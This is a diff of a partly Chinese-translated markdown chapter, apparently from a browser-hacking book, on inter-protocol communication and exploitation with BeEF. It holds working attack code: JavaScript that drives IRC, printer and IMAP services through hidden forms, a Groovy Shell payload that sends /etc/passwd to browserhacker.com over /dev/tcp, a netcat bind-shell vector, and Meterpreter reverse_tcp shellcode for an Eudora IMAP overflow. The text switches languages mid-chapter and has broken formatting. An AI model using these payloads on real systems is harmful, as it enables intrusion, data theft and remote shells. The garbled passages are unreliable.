 // 等待 <timeout> 秒，直到 IFrame URL 片段匹配 #ipc_result=
 function wait() {
-
 try {
  if (/#ipc_result=/.test(document.getElementById("ipc_posix_window").\
 contentWindow.location)) {
@@ -13375,18 +13510,21 @@ __END_OF_POSIX_IPC__
 
 HTML 表单包含两个输入框：`response` 与 `endTalkBack`，其 `action` 属性指向 `http://172.16.37.153:7777/index.html?&/bin/sh;`。与之前的示例相同，使用 `multipart/form-data` 的 Content‑Type（也可以使用 `text/plain`）。
 
-
-
-
 The first response input field of the form element contains multiple echo commands that are used to construct the HTTP response, together with the final command to be executed. In this example, the first 4096 bytes of the command results are returned. You can change the result_size variable in the previous code to accommodate for more space if needed.
 
 The second endTalkBack input field contains the __END_OF_POSIX_IPC__ delimiter, the ipc_contentdiv that holds the command results, and a small script that changes the location of the IFrame to the parent one. The parent location is the current location of the page where the JavaScript code is executing:
 
+
+
+`body2 = "__END_OF_POSIX_IPC__</div><s"+"cript>window.location='" +`
+
+`parent + "#ipc_result='+encodeURI(" +`
+
+`"document.getElementById(\\\"ipc_content\\\").innerHTML);</"`
+
+`+"script></body></html>";`
+
 ```
-body2 = "__END_OF_POSIX_IPC__</div><s"+"cript>window.location='" +
-parent + "#ipc_result='+encodeURI(" +
-"document.getElementById(\\\"ipc_content\\\").innerHTML);</"
-+"script></body></html>"; 
 ```
 
 Figure 10-13 shows the raw body of the POST request, where you can see both input fields and their values.
@@ -13397,9 +13535,9 @@ start figure
 
 ![c10f013.tif](img/c10f013.png)
 
-end figure 
+end figure
 
-When the HTTP response comes back, it contains the command results and the small piece of JavaScript code that changes the location. After the command executes, you can check if the location of the IFrame contains #ipc_result in the URL. This is performed with the wait() function that continues to check the IFrame for a valid response. A typical HTTP response looks like a classic HTML page, as shown in Figure 10-14. Note that the command results are inside the ipc_content div, up to the __END_OF_POSIX_IPC__, and the JavaScript code that changes the IFrame location to browserhacker.com is immediately after that.
+When the HTTP response comes back, it contains the command results and the small piece of JavaScript code that changes the location. After the command executes, you can check if the location of the IFrame contains #ipc_result in the URL. This is performed with the `wait()` function that continues to check the IFrame for a valid response. A typical HTTP response looks like a classic HTML page, as shown in Figure 10-14. Note that the command results are inside the `ipc_content` div, up to the `__END_OF_POSIX_IPC__`, and the JavaScript code that changes the IFrame location to browserhacker.com is immediately after that.
 
 start figure
 
@@ -13407,9 +13545,9 @@ start figure
 
 ![c10f014.tif](img/c10f014.png)
 
-end figure 
+end figure
 
-The results of running this JavaScript are shown in Figure 10-15, where you can clearly recognize the output of the netstat command.
+The results of running this JavaScript are shown in Figure 10-15, where you can clearly recognize the output of the `netstat` command.
 
 start figure
 
@@ -13417,52 +13555,66 @@ start figure
 
 ![c10f015.tif](img/c10f015.png)
 
-end figure 
+end figure
 
 This will work in current versions of Firefox without errors in the JavaScript console. Unfortunately, this technique will not work with WebKit browsers like Chrome or Safari. Instead, you will get SOP violation errors because you can’t communicate between frames with different origins. This is yet another example of how the SOP is inconsistent across browsers.
 
 For browsers other than Firefox, you can employ a modified approach using one of the following two options:
 
-* Issue the cross-origin POST request with XHR, inserting additional headers with the echo command including the Access-Control-Allow-Origin: * headers. The response could then be read directly via an XHR request. The BeEF Bind, which is covered later in this chapter, uses this exact approach.
-
+* Issue the cross-origin POST request with XHR, inserting additional headers with the `echo` command including the `Access-Control-Allow-Origin: *` headers. The response could then be read directly via an XHR request. The BeEF Bind, which is covered later in this chapter, uses this exact approach.
 * Engage the same approach used by XssRays as covered in Chapter 9.
 
-This whole section has been based on the example of a simple Netcat listener bound to the /bin/sh command. It’s not often that you will come across situations like this though. Now that you have an understanding of IPC in a theoretical context, let’s explore some more practical applications.
+This whole section has been based on the example of a simple Netcat listener bound to the `/bin/sh` command. It’s not often that you will come across situations like this though. Now that you have an understanding of IPC in a theoretical context, let’s explore some more practical applications.
 
-#### Internet Relay Chat Inter-protocol Communication Example
+### Internet Relay Chat Inter-protocol Communication Example
 
 IRC is an error-tolerant protocol that doesn’t reset the connection if you send data that doesn’t comply with the protocol grammar. This is perfect for you, because the HTTP headers are not going to conform to the protocol specifications. They will simply produce errors and allow you to send your commands from a known state.
 
-Reusing the createIframeIpecForm from BeEF’s JavaScript API, you can join channels and post messages to an IRC server with the following code snippet:
+Reusing the `createIframeIpecForm` from BeEF’s JavaScript API, you can join channels and post messages to an IRC server with the following code snippet:
 
 ```
 var rhost   = 'irc_server';
+
 var rport   = '6667';
+
 var nick    = 'user1234';
+
 var channel = '#channel_1';
+
 var message = 'BeEFed';
 
 var irc_commands = "NICK " + nick + "\n";
+
 irc_commands    += "USER " + nick + " 8 * : " + nick + " user\n";
+
 irc_commands    += "JOIN " + channel + "\n";
+
 irc_commands    += "PRIVMSG " + channel + " :" + message + "\nQUIT\n";
 
 // send commands
+
 var irc_iframe = 
+
 beef.dom.createIframeIpecForm(rhost, rport, 
+
 "/index.html", 
+
 irc_commands);
 
 // clean up
+
 cleanup = function() {
+
     document.body.removeChild(irc_iframe);
+
 }
+
 setTimeout("cleanup()", 15000);
 ```
 
 In 2010, multiple IRC server providers such as EFnet, OFTC, and FreeNode were under a sustained attack.29 Attackers were embedding JavaScript code (similar to the previous code snippet) and many users inadvertently triggered the code while browsing to those pages. This resulted in the spamming of multiple IRC channels.30
 
-#### Printer Service Inter-protocol Communication Example
+### Printer Service Inter-protocol Communication Example
 
 Most multifunction network printers, such as HP and Canon devices, run multiple services. This often includes the implementation of a full TCP/IP stack. These devices are likely to be found in the internal network, and can be fingerprinted easily using the techniques previously described.
 
@@ -13476,13 +13628,15 @@ start figure
 
 ![c10f016.tif](img/c10f016.png)
 
-end figure 
+end figure
 
 This interface was very basic, and only required you to open a TCP connection to the printer’s port and write some text. Performing this with Netcat is as simple as:
 
 ```
 $ nc 10.90.1.131 9100
+
 Hi from BeEF!
+
 ^C
 ```
 
@@ -13490,13 +13644,21 @@ This protocol also turned out to be a perfect candidate for IPC, because nothing
 
 ```
 var body = "Hi from BeEF!\n";
+
 var ip = "10.90.1.131";
+
 var port = 9100;
+
 var xhr = new XMLHttpRequest();
+
 xhr.open("POST", "http://" + ip + ":" + port + "/",false);
+
 xhr.setRequestHeader("Content-Type", "text/plain");
+
 xhr.setRequestHeader('Accept','*/*');
+
 xhr.setRequestHeader("Accept-Language", "en");
+
 xhr.send(body);
 ```
 
@@ -13508,37 +13670,43 @@ start figure
 
 ![c10f017.tif](img/c10f017.png)
 
-end figure 
+end figure
 
-Enhancing this attack, you can also send PostScript commands to the printer34 that will be interpreted by the PostScript processor. The advantage of using PostScript enables you to format the page properly, perhaps enabling you to create a more legitimate looking printout. The following code demonstrates using PostScript, and can be used with the previous JavaScript code by changing the body variable:
+Enhancing this attack, you can also send PostScript commands to the printer34 that will be interpreted by the PostScript processor. The advantage of using PostScript enables you to format the page properly, perhaps enabling you to create a more legitimate looking printout. The following code demonstrates using PostScript, and can be used with the previous JavaScript code by changing the `body` variable:
 
 ```
 var body = String.fromCharCode(27) + 
+
 "%-12345X@PJL ENTER LANGUAGE = POSTSCRIPT\r\n"
+
 + "%!PS\r\n"
+
 + "/Courier findfont\r\n"
+
 + "20 scalefont\r\n"
+
 + "setfont\r\n"
+
 + "72 500 moveto\r\n"
+
 + "(Demonstrating IPC) show\r\n"
+
 + "showpage\r\n"
+
 + String.fromCharCode(27) + "%-12345X";
 ```
 
+- [如图 10-18 所示]，结果是一张使用 Courier 字体打印的包含 “Demonstrating IPEC” 内容的页面，位于左下角坐标 72 和 500 处。请注意，PostScript 文件的默认坐标是以 1/72 英寸为单位的。
 
-
-
--   [如图 10-18 所示]，结果是一张使用 Courier 字体打印的包含 “Demonstrating IPEC” 内容的页面，位于左下角坐标 72 和 500 处。请注意，PostScript 文件的默认坐标是以 1/72 英寸为单位的。
-
- start figure 
+start figure
 
 **Figure 10-18:** IPEC 打印带格式的 PostScript 页面的结果
 
 ![c10f018.tif](img/c10f018.png)
 
- end figure 
+end figure
 
-#### IMAP 协议通信示例
+### IMAP 协议通信示例
 
 IMAP 协议，特别是第 3 版和第 4 版，是一个可以实现 IPC（协议间通信）的协议的良好示例。虽然协议本身是一个很好的候选者，但其在现实中的适用性受到现代浏览器因端口禁用实施而限制直接访问 TCP 端口 143 的可能性。
 
@@ -13546,7 +13714,7 @@ IMAP 协议，特别是第 3 版和第 4 版，是一个可以实现 IPC（协�
 
 无论哪种情况，IMAP 都是一个很好的例子，用于说明浏览器中的攻击。由于其高度教育价值，你在本章中会在多个地方看到它的使用。
 
-为了演示如何在 Firefox 中绕过端口禁用，最简单的方法是向 pref.js 扩展文件中添加以下行：
+为了演示如何在 Firefox 中绕过端口禁用，最简单的方法是向 `pref.js` 扩展文件中添加以下行：
 
 ```
 pref("network.security.ports.banned.override", "143");
@@ -13558,50 +13726,67 @@ IMAP 实现之所以可以在浏览器中进行 IPC，是因为这些服务通�
 
 ```
 var server = '172.16.37.151';
+
 var port = '143';
+
 var commands = 'a01 login root password\na002 logout';
 
 var target = "http://" + server + ":" + port + "/abc.html";
+
 var iframe = beef.dom.createInvisibleIframe();
 
 var form = document.createElement('form');
+
 form.setAttribute('name', 'data');
+```
+
+
+
+```
 form.setAttribute('action', target);
+
 form.setAttribute('method', 'post');
+
 form.setAttribute('enctype', 'text/plain');
 
 var input = document.createElement('input');
+
 input.setAttribute('id', 'data1')
+
 input.setAttribute('name', 'data1')
+
 input.setAttribute('type', 'hidden');
+
 input.setAttribute('value', commands);
+
 form.appendChild(input);
 
 iframe.contentWindow.document.body.appendChild(form);
+
 form.submit();
 ```
 
-本例中使用的 IMAP 服务器是 Eudora，后文将用于演示协议间利用。如图 10-19 所示，当 IMAP 服务器收到 POST 请求时，HTTP 头部会被解析为无效命令（“不 recognized 或在当前状态下不合法”）。POST 主体中的 IMAP 命令被正确解析。在此示例中，认证尝试失败是因为我们不知道正确的凭据。
+本例中使用的 IMAP 服务器是 Eudora，后文将用于演示协议间利用。如图 10-19 所示，当 IMAP 服务器收到 `POST` 请求时，HTTP 头部会被解析为无效命令（“不 recognized 或在当前状态下不合法”）。`POST` 主体中的 IMAP 命令被正确解析。在此示例中，认证尝试失败是因为我们不知道正确的凭据。
 
- start figure 
+start figure
 
 **Figure 10-19:** IPC 导致的 IMAP 服务器日志
 
 ![c10f019.eps](img/c10f019.png)
 
- end figure 
+end figure
 
 你可以在图 10-19 中看到，IMAP 服务器返回 “incorrect password”。在成功登录后，会返回不同的结果，需要加以区分。
 
-一些 IMAP 服务器支持发送电子邮件，这可以用于创建侧信道。根据前文在非 HTTP 服务指纹识别部分的介绍， timing differences 也可以被利用，具体取决于实现。一旦登录，查看 Inbox 的内容通常比未认证的连接错误耗时更长。
+一些 IMAP 服务器支持发送电子邮件，这可以用于创建侧信道。根据前文在非 HTTP 服务指纹识别部分的介绍，`timing differences` 也可以被利用，具体取决于实现。一旦登录，查看 `Inbox` 的内容通常比未认证的连接错误耗时更长。
 
 前文列出的协议并非 IPC 兼容目标的完整列表。任何满足 IPC 条件（容错性和数据封装）的其他协议实现，都可能通过 IPC 进行交互。下次你在渗透测试中遇到新的潜在 IPC 目标时，请记住这些依赖关系。
 
 ### 实现协议间利用
 
-前文讨论了协议间通信，但 Wade Alcorn 的研究并未在此停止。Alcorn 在 2007 年的研究论文中展示了 IPC 技术可以扩展到不仅实现通信，还能实现利用，从而得到协议间利用（Inter-protocol Exploitation，IPE）。这里讨论的某些主题涉及较低层的应用利用。如果你需要更多信息，请不要忘记查阅 The Shellcoder Hacker’s Handbook 2nd Edition。
+前文讨论了协议间通信，但 Wade Alcorn 的研究并未在此停止。Alcorn 在 2007 年的研究论文中展示了 IPC 技术可以扩展到不仅实现通信，还能实现利用，从而得到协议间利用（Inter-protocol Exploitation，IPE）。这里讨论的某些主题涉及较低层的应用利用。如果你需要更多信息，请不要忘记查阅 `The Shellcoder Hacker’s Handbook 2nd Edition`。
 
-如果你能够通过 HTTP 与非 HTTP 协议进行通信（如前一节所示），你发送的数据也可以包含 Shellcode。类似于 IPC，IPE 也依赖于容错性和数据封装。
+如果你能够通过 HTTP 与非 HTTP 协议进行通信（如前一节所示），你发送的数据也可以包含 `Shellcode`。类似于 IPC，IPE 也依赖于容错性和数据封装。
 
 让我们扩展之前用于讨论 IPC 的初始示例。假设一个服务寻找类似以下命令：
 
@@ -13609,25 +13794,23 @@ form.submit();
 WRITE <content> <file_path>
 ```
 
-假设处理 <file_path> 的代码因为未对 <content> 的长度进行检查，而使用 memcpy 将其复制到 1024 字节的缓冲区，导致缓冲区溢出。如果你在查找应用漏洞，可能会尝试对输入进行模糊测试，试图触发崩溃条件。当然，这个虚构的例子会崩溃。
+假设处理 `<file_path>` 的代码因为未对 `<content>` 的长度进行检查，而使用 `memcpy` 将其复制到 1024 字节的缓冲区，导致缓冲区溢出。如果你在查找应用漏洞，可能会尝试对输入进行模糊测试，试图触发崩溃条件。当然，这个虚构的例子会崩溃。
 
-当提交文件路径为 1500 字节的 WRITE 命令时，分析得到的段错误数据表明你可以控制 Extended Instruction Pointer（EIP），并且在内存中有 800 字节的空间用于放置 Shellcode。谁会想到？这个虚构的例子正好满足你对 IPE 的需求！
+当提交文件路径为 1500 字节的 `WRITE` 命令时，分析得到的段错误数据表明你可以控制 Extended Instruction Pointer（`EIP`），并且在内存中有 800 字节的空间用于放置 `Shellcode`。谁会想到？这个虚构的例子正好满足你对 IPE 的需求！
 
 #### 计算 HTTP 头大小
 
-当你发送包含 Shellcode 的 POST 请求时，往往需要非常精确。你需要指定返回地址应该指向的位置，以及需要多少个 NOP（以及其他垃圾字节）。即使 1 字节的误差也可能导致你试图攻击的监听服务崩溃。这可能导致 Shellcode 未能按预期执行，从而失败。
+当你发送包含 `Shellcode` 的 `POST` 请求时，往往需要非常精确。你需要指定返回地址应该指向的位置，以及需要多少个 `NOP`（以及其他垃圾字节）。即使 1 字节的误差也可能导致你试图攻击的监听服务崩溃。这可能导致 `Shellcode` 未能按预期执行，从而失败。
 
 正如你所学到的，HTTP 头部在目标协议中会被丢弃。但这并不意味着它们不会被解析并加载到你正在向其发送数据的进程的内存中。在某些情况下，这意味着必须计入头部的大小。
 
-验证 HTTP 头部是否存储在内存的最简便方法是向想要分析的进程附加调试器。正如下文在 IMAP 利用示例中讨论的，Eudora WorldMail 版本 6.1.21（及更早版本）在解析 POST 主体内容之前，会先将 HTTP 头部存储在内存中。
+验证 HTTP 头部是否存储在内存的最简便方法是向想要分析的进程附加调试器。正如下文在 IMAP 利用示例中讨论的，Eudora WorldMail 版本 6.1.21（及更早版本）在解析 `POST` 主体内容之前，会先将 HTTP 头部存储在内存中。
 
-此外，你无法事先确定在发送跨源 POST 请求时使用的 HTTP 头部的精确大小。每个浏览器都不同，往往包含不同的 HTTP 头部。你的 exploit 必须可靠，否则 Shellcode 将无法执行，服务可能崩溃。
+此外，你无法事先确定在发送跨源 `POST` 请求时使用的 HTTP 头部的精确大小。每个浏览器都不同，往往包含不同的 HTTP 头部。你的 `exploit` 必须可靠，否则 `Shellcode` 将无法执行，服务可能崩溃。
 
-那么，如何解决这个问题？一种方法是提前确定浏览器提交的跨源请求的头部精确大小。BeEF 通过在独特端口上绑定套接字来模拟跨源情况，向该服务器发送相同的跨源请求。到达套接字的原始 HTTP 请求内容用于计算头部的精确大小。被钩住的浏览器可以随后获取跨源请求长度的 JSON 对象结果。负责计算头部大小并随后将结果返回给被钩住浏览器的代码如下：
+那么，如何解决这个问题？一种方法是提前确定浏览器提交的跨源请求的头部精确大小。`BeEF` 通过在独特端口上绑定套接字来模拟跨源情况，向该服务器发送相同的跨源请求。到达套接字的原始 HTTP 请求内容用于计算头部的精确大小。被钩住的浏览器可以随后获取跨源请求长度的 JSON 对象结果。负责计算头部大小并随后将结果返回给被钩住浏览器的代码如下：
 
-
-
-
+```
 # 确定跨域请求的 HTTP 头部的精确大小。
 # 需要准确计算垃圾并防止错误。
 # 完整 URL 为 <BeEF_server>/api/ipec/junk/<socket_name>
@@ -13669,20 +13852,23 @@ get '/junk/:name' do
     halt 404
   end
 end
+```
 
-Armed with this information, NOPs (or any additional garbage sizes) can be reliably calculated on the fly by the hooked browser before sending its exploit payload to the vulnerable service. It is then easy enough to adjust the Host, Content-Type and Referrer headers that will likely be different, to send a cross-origin HTTP request. It will contain the NOPs and Shellcode sizes adjusted to the precision required to execute without error.
+Armed with this information, `NOPs` (or any additional garbage sizes) can be reliably calculated on the fly by the hooked browser before sending its exploit payload to the vulnerable service. It is then easy enough to adjust the `Host`, `Content-Type` and `Referrer` headers that will likely be different, to send a cross-origin HTTP request. It will contain the `NOPs` and `Shellcode` sizes adjusted to the precision required to execute without error.
 
-One of the issues discussed earlier is whether the service being exploited is storing the HTTP headers in the same buffer as where your Shellcode is landing. This can be particularly important for post-authentication exploits, as discussed in the next examples. You first need valid credentials to access the service, followed by the Shellcode to exploit the stack overflow vulnerability. For example, if you were to try to exploit a vulnerability within an FTP server’s implementation of the MKD command, you would first have to successfully authenticate to the FTP server.
+One of the issues discussed earlier is whether the service being exploited is storing the HTTP headers in the same buffer as where your `Shellcode` is landing. This can be particularly important for post-authentication exploits, as discussed in the next examples. You first need valid credentials to access the service, followed by the `Shellcode` to exploit the stack overflow vulnerability. For example, if you were to try to exploit a vulnerability within an `FTP` server’s implementation of the `MKD` command, you would first have to successfully authenticate to the `FTP` server.
 
 Ty Miller and Michele Orrù presented research into BeEF’s Bind IPE capability at RuxCon 2012.37 Rodrigo Marcos and the SecForce crew extended this research further by successfully exploiting post-authentication vulnerabilities without needing to calculate the length of the HTTP headers first:38
 
 ```
 var auth = 'USER anonymous\r\nPASS anonymous\r\n';
+
 var payload = 'MKD \x89[…shellcode…]';
+
 var body = auth + payload;
 ```
 
-They ported an existing exploit for EasyFTP Server to an Inter-protocol Exploit that was submitted within an HTTP POST request body. The request body is generated in the preceding code.
+They ported an existing exploit for EasyFTP Server to an Inter-protocol Exploit that was submitted within an HTTP `POST` request body. The request body is generated in the preceding code.
 
 Marcos and the SecForce crew discovered that, in this instance of IPE, the exact HTTP header size was not required. However, this is not always the case. It’s important to remember that depending on the exploit that you’re attempting, you may need a method to calculate the size of the HTTP headers before you submit your exploit payload. Considering this, in addition to error tolerance and data encapsulation, the other dependency that may need to be met to shift from IPC to IPE is the size of the submitted headers.
 
@@ -13694,29 +13880,37 @@ Now that you have considered some requirements for IPE, let’s jump into the mo
 
 A good example of an IPE attack can be demonstrated against the Groovy Shell Server.39 Groovy Shell Server is a daemonized version of the popular Groovy Shell, a command-line application that enables you to evaluate Groovy code on the fly. It is quite common in environments that rely on Groovy and Grails to speed up the classic development of Java applications using more agile methodologies. In May 2013, Brendan Coles discovered that not only was the Groovy Shell Server vulnerable to Remote Code Execution, but it also met the criteria for IPE. The custom protocol used by this tool is reachable on port 6789 by default, which is also advantageous because port banning does not prevent access to this port.
 
-In this instance, RCE exploitation is easier than more complex overflows, because you don’t have to deal with memory allocation or Shellcode. Because the Groovy Shell accepts any kind of content on port 6789 (as a normal shell environment would do), IPE can be used. It’s just a matter of encapsulating the Groovy code into an HTTP POST request, as shown here:
+In this instance, RCE exploitation is easier than more complex overflows, because you don’t have to deal with memory allocation or Shellcode. Because the Groovy Shell accepts any kind of content on port 6789 (as a normal shell environment would do), IPE can be used. It’s just a matter of encapsulating the Groovy code into an HTTP `POST` request, as shown here:
 
 ```
 var rhost = '192.168.0.100'; // Targeted host
+
 var rport = '6789'; // Targeted port
 
 // /dev/tcp is supported in most 
+
 // Linux distributions (Debian, Ubuntu, etc..)
+
 var cmd = 'cat /etc/passwd >/dev/tcp/browserhacker.com/8888';
 
 // create the final payload using Groovy's
+
 // "command".execute() method
+
 var payload = "\r\ndiscard\r\nprintln '" + cmd + 
+
 "'.execute().text\r\ngo\r\nexit\r\n";
 
 // send the POST request
+
 beef.dom.createIframeIpecForm(rhost, rport, "/", payload);
 ```
 
-As you can see from the payload variable value, the command cmd gets executed in a similar way to how Java executes system commands. In Java, you would perform:
+As you can see from the payload variable value, the command `cmd` gets executed in a similar way to how Java executes system commands. In Java, you would perform:
 
 ```
 String cmd = "uname -ra";
+
 Runtime.getRuntime().exec(cmd);
 ```
 
@@ -13724,198 +13918,296 @@ Although the Groovy language syntax simplifies this slightly, to perform the sam
 
 ```
 def cmd = "uname -ra"
+
 cmd.execute()
 ```
 
-If the server being exploited is running on a Linux operating system that has the /dev/tcp device configured, you can extrude the contents of /etc/passwd to browserhacker.com:8888. There’s nothing preventing you from creating multiple IFrames, each one using a different RCE vector—for example, a Netcat bind or reverse connection—and targeting different platforms.
+
+
+If the server being exploited is running on a Linux operating system that has the `/dev/tcp` device configured, you can extrude the contents of `/etc/passwd` to browserhacker.com:8888. There’s nothing preventing you from creating multiple IFrames, each one using a different RCE vector—for example, a `Netcat` bind or reverse connection—and targeting different platforms.
 
 #### EXTRACT Inter-protocol Exploitation Example
 
 EXTRACT is a Web Information Management System. It allows users to store and search many different kinds of structured data in a database classified in categories. It was found40 to be vulnerable to RCE, once again by Brendan Coles. By default, the custom protocol used by this tool is reachable on TCP port 10100. This is helpful because port banning doesn’t prevent HTTP connections to that port.
 
-Unlike the previous Groovy Shell exploit, this service is slightly trickier. Within the protocol, the createuser command was found to be vulnerable to command execution. However, the expected input cannot contain any spaces, which makes sense because a username shouldn’t have any whitespace characters. Experienced penetration testers may be familiar with the following attack vector that does not contain any spaces:
+Unlike the previous Groovy Shell exploit, this service is slightly trickier. Within the protocol, the `createuser` command was found to be vulnerable to command execution. However, the expected input cannot contain any spaces, which makes sense because a username shouldn’t have any whitespace characters. Experienced penetration testers may be familiar with the following attack vector that does not contain any spaces:
 
 ```
 {netcat,-l,-p,1337,-e,/bin/bash}
 ```
 
-This vector is using the Bracket Expansion feature41 within the Bash shell often found on Linux systems. The previous line will be expanded by Bash, removing the braces, {}, replacing every comma with a space, and finally executing the command.
+This vector is using the Bracket Expansion feature41 within the `Bash` shell often found on Linux systems. The previous line will be expanded by `Bash`, removing the braces, `{}`, replacing every comma with a space, and finally executing the command.
 
 The final attack vector to exploit the EXTRACT 0.5.1 service is:
 
 ```
 var cmd = "{netcat,-l,-p,1337,-e,/bin/bash}";
+
 var payload = 'createuser '+cmd+'&>/dev/null; echo;\r\nquit\r\n';
+
 beef.dom.createIframeIpecForm(host, port, "/index.html", payload);
 ```
 
-If command execution works as expected, you should be able to connect to port 1337 on the target host with Netcat, and get a shell. If the exploited system is behind a firewall, you could use the bind shell IPC methods explored earlier in this chapter.
+If command execution works as expected, you should be able to connect to port 1337 on the target host with `Netcat`, and get a shell. If the exploited system is behind a firewall, you could use the bind shell IPC methods explored earlier in this chapter.
 
-
-
--   Tim Shelton 发现，Eudora WorldMail IMAP 服务器版本 6.1.21 及更早版本在提交前身份验证的情况下，存在缓冲区溢出漏洞，利用方式是提交一个精心构造的 `LIST` 命令。42 根据对 HTTP 数据（而非 IMAP 数据）的内存分析，发现 HTTP 头部在内存中的存储方式，如图 [Figure 10-20 所示，在已使用 Immunity Debugger 附加到进程后可看到：]
-
-```
-start figure
-```
+-   Tim Shelton 发现，Eudora WorldMail IMAP 服务器版本 6.1.21 及更早版本在提交前身份验证的情况下，存在缓冲区溢出漏洞，利用方式是提交一个精心构造的 `LIST` 命令。42 根据对 HTTP 数据（而非 IMAP 数据）的内存分析，发现 HTTP 头部在内存中的存储方式，如图 Figure 10-20 所示，在已使用 Immunity Debugger 附加到进程后可看到：
 
 **Figure 10-20:** HTTP 头部在进程内存中的存储情况
 
 ![c10f020.eps](img/c10f020.png)
 
-```
-end figure
-```
-
 -   要成功利用该服务，需要了解浏览器发送的组合 HTTP 头部的数据长度，因为这决定了你可以在内存中控制数据的放置位置。
 
--   你可以使用 BeEF 通过前文讨论的 HTTP 头部计算逻辑，分两步完成计算。假设 BeEF 运行在 `browserhacker.com:3000`，且 HTTP 计算服务器监听端口 2000，可用以下 JavaScript 计算正确的 HTTP 头部大小，以便在后续的利用请求中使用：
+-   你可以使用 `BeEF` 通过前文讨论的 HTTP 头部计算逻辑，分两步完成计算。假设 `BeEF` 运行在 `browserhacker.com:3000`，且 HTTP 计算服务器监听端口 2000，可用以下 JavaScript 计算正确的 HTTP 头部大小，以便在后续的利用请求中使用：
 
 ```javascript
 var beef_host = "http://browserhacker.com";
+
 var beef_junk_port = 2000;
+
 var uri = "http://" + beef_host + ":" + beef_junk_port + "/";
+
 var xhr = new XMLHttpRequest();
+
 xhr.open("POST", uri, true);
+
 xhr.setRequestHeader("Content-Type", "text/plain");
+
 xhr.setRequestHeader('Accept','*/*');
+
 xhr.setRequestHeader("Accept-Language", "en");
+
 xhr.send("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + 
+
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
 ```
 
--   当套接字收到请求时，BeEF 控制台会报告如下信息：
+-   当套接字收到请求时，`BeEF` 控制台会报告如下信息：
 
 ```
 [18:56:06][*] [IPEC] Cross-origin XmlHttpRequest headers
+
  size - received from bind socket [imapeudora1]: 443 bytes.
 ```
 
--   此时 BeEF 服务器已知道跨域 HTTP 请求头的精确大小。下一步是将该正确的大小通知被钩子的浏览器，使其能够构造跨协议漏洞（Inter‑protocol Exploit），将 NOP 与 Shellcode 放置在正确的内存位置。
+-   此时 `BeEF` 服务器已知道跨域 HTTP 请求头的精确大小。下一步是将该正确的大小通知被钩子的浏览器，使其能够构造跨协议漏洞（Inter‑protocol Exploit），将 NOP 与 Shellcode 放置在正确的内存位置。
 
 -   在本例中，你希望使用 Metasploit 的 `Meterpreter reverse_tcp` 负载，而不是自行构造恶意负载。假设反向连接监听器位于 `172.16.37.1:9999`，下面的 Metasploit 命令会为你生成 Shellcode：
 
 ```javascript
 msf payload(reverse_tcp) > use payload/windows/meterpreter/reverse_tcp
+
 msf payload(reverse_tcp) > set LHOST 172.16.37.1
+
 LHOST => 172.16.37.1
+
 msf payload(reverse_tcp) > set LPORT 9999
+
 LPORT => 9999
+
 msf payload(reverse_tcp) > generate -b "\x00\x0a\x0d\x20\x7b"
+
 # windows/meterpreter/reverse_tcp - 317 bytes (stage 1)
+
 # http://www.metasploit.com
+
 # Encoder: x86/shikata_ga_nai
+
 # VERBOSE=false, LHOST=172.16.37.1, LPORT=9999, 
+
 buf = 
+
 "\xda\xdf\xd9\x74\x24\xf4\xbe\xba\xeb\xc6\xfc\x5a\x29\xc9" +
+
 "\xb1\x49\x83\xea\xfc\x31\x72\x15\x03\x72\x15\x58\x1e\x3a" +
+
 "\x14\x15\xe1\xc3\xe5\x45\x6b\x26\xd4\x57\x0f\x22\x45\x67" +
+
 "\x5b\x66\x66\x0c\x09\x93\xfd\x60\x86\x94\xb6\xce\xf0\x9b" +
+
 "\x47\xff\x3c\x77\x8b\x9e\xc0\x8a\xd8\x40\xf8\x44\x2d\x81" +
+
 "\x3d\xb8\xde\xd3\x96\xb6\x4d\xc3\x93\x8b\x4d\xe2\x73\x80" +
+
 "\xee\x9c\xf6\x57\x9a\x16\xf8\x87\x33\x2d\xb2\x3f\x3f\x69" +
+
 "\x63\x41\xec\x6a\x5f\x08\x99\x58\x2b\x8b\x4b\x91\xd4\xbd" +
+
 "\xb3\x7d\xeb\x71\x3e\x7c\x2b\xb5\xa1\x0b\x47\xc5\x5c\x0b" +
+
 "\x9c\xb7\xba\x9e\x01\x1f\x48\x38\xe2\xa1\x9d\xde\x61\xad" +
+
 "\x6a\x95\x2e\xb2\x6d\x7a\x45\xce\xe6\x7d\x8a\x46\xbc\x59" +
+
 "\x0e\x02\x66\xc0\x17\xee\xc9\xfd\x48\x56\xb5\x5b\x02\x75" +
+
 "\xa2\xdd\x49\x12\x07\xd3\x71\xe2\x0f\x64\x01\xd0\x90\xde" +
+
 "\x8d\x58\x58\xf8\x4a\x9e\x73\xbc\xc5\x61\x7c\xbc\xcc\xa5" +
+
 "\x28\xec\x66\x0f\x51\x67\x77\xb0\x84\x27\x27\x1e\x77\x87" +
+
 "\x97\xde\x27\x6f\xf2\xd0\x18\x8f\xfd\x3a\x31\x25\x07\xad" +
+
 "\x92\xa9\x22\x2c\x83\xcb\x2c\x09\x5c\x42\xca\x3f\x72\x02" +
+
 "\x44\xa8\xeb\x0f\x1e\x49\xf3\x9a\x5a\x49\x7f\x28\x9a\x04" +
+
 "\x88\x45\x88\xf1\x78\x10\xf2\x54\x86\x8f\x99\x58\x12\x2b" +
+
 "\x08\x0e\x8a\x31\x6d\x78\x15\xca\x58\xf2\x9c\x5e\x23\x6d" +
+
 "\xe1\x8e\xa3\x6d\xb7\xc4\xa3\x05\x6f\xbc\xf7\x30\x70\x69" +
+
 "\x64\xe9\xe5\x91\xdd\x5d\xad\xf9\xe3\xb8\x99\xa6\x1c\xef" +
+
 "\x1b\x9b\xca\xd6\x99\xed\x78\x3b\x62"
 ```
 
--   根据前文的 HTTP 头部计算，你已确定需要考虑 423 字节的头部。你之前计算的 Shellcode 总大小为 769 字节，这足以使用 Meterpreter Stager 负载。但仍需根据实际可用空间动态调整 NOP 数量，防止 Shellcode 未能正确落在内存中。
+-   根据前文的 HTTP 头部计算，你已确定需要考虑 423 字节的头部。你之前计算的 Shellcode 总大小为 769 字节，这足以使用 `Meterpreter Stager` 负载。但仍需根据实际可用空间动态调整 NOP 数量，防止 Shellcode 未能正确落在内存中。
 
 -   可用以下 JavaScript 发送 Stager 给 IMAP 服务，在计算出可用空间和 HTTP 头部大小后：
 
 ```javascript
 var stager = "B33FB33F" +
+
 "\xda\xdf\xd9\x74\x24\xf4\xbe\xba\xeb\xc6\xfc\x5a\x29\xc9" +
+
 "\xb1\x49\x83\xea\xfc\x31\x72\x15\x03\x72\x15\x58\x1e\x3a" +
+
